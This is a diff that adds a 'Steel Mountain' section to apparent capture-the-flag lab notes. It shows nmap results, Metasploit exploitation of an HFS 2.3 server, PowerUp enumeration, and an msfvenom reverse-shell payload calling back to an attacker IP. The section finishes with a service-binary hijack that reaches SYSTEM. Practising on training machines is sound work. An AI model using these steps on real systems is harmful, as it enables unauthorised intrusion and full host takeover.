@@ -344,3 +344,98 @@ root@kenobi:~#
 The command the script runs is: `curl -I localhost`. So if we would just `cp /bin/bash ./curl` it would still pass the argument and fail.
 
 Finally, we can get the root flag: `cat /root/root.txt`.
+
+### Day 2 - Practice
+
+#### Steel Mountain
+
+We start with nmap as usual:
+```
+Host is up (0.038s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2020-04-25T14:03:27+00:00; -1s from scanner time.
+8080/tcp  open  http               HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+49161/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:81:1a:c8:73:28 (unknown)
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-04-25T14:03:22
+|_  start_date: 2020-04-25T14:01:24
+```
+
+#### Using metasploit framework
+
+You can get PowerUp.ps1 from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).
+
+```
+msfconsole
+search rejetto
+use 0
+set RHOSTS target
+set RPORT 8080
+run
+
+upload PowerUp.ps1
+load powershell
+powershell_shell
+. ./PowerUp.ps1
+Invoke-AllChecks
+```
+Result (excerpt):
+```
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+```
+
+We want to abuse this service and write permissions along CanRestart sp we generate a payload with:
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.2.58 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe`
+
+Stop the service, replace the binary and start the service:
+
+```
+sc stop AdvancedSystemCareService9
+copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+sc start AdvancedSystemCareService9
+```
+
+List the processes and migrate to "TrustedInstaller":
+```
+ps
+migrate 904
+getsystem
+whoami
+cd C:\Users\Administrator\Desktop
+more root.txt
+```
